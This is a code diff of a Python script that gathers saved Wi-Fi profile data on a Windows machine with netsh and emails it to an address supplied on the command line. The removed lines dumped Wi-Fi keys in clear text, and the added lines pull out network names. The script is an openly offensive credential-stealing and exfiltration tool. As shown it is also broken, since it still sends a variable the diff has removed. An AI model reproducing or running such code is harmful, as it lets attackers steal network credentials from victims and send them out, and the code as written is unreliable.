@@ -5,14 +5,13 @@
 import subprocess
 import optparse
 import smtplib
+import re
 
 
 def get_arguments():
     """Get user supplied arguments from terminal."""
     parser = optparse.OptionParser()
     # arguments
-    parser.add_option('-i', '--interface', dest='network_interface', help='Network interface')
-    parser.add_option('-n', '--name', dest='network_name', help='Network name')
     parser.add_option('-e', '--email', dest='email', help='Email address to send data to')
     parser.add_option('-p', '--password', dest='password', help='Email password')
 
@@ -31,10 +30,9 @@ def send_mail(email, password, message):
 
 
 options = get_arguments()
-# change_mac(options.network_interface, options.network_name)     # changes MAC address
 
-command = 'netsh %s show profile %s  key=clear' % (options.network_interface, options.network_name)
-
-result = subprocess.check_output(command, shell=True)
+command = 'netsh wlan show profile'                                 # shows wifi profile
+networks = subprocess.check_output(command, shell=True)
+network_names = re.findall('(?:Profile\s*:\s)(.*)', networks)       # regex to search for network SSIDs
 
 send_mail(options.email, options.password, result)
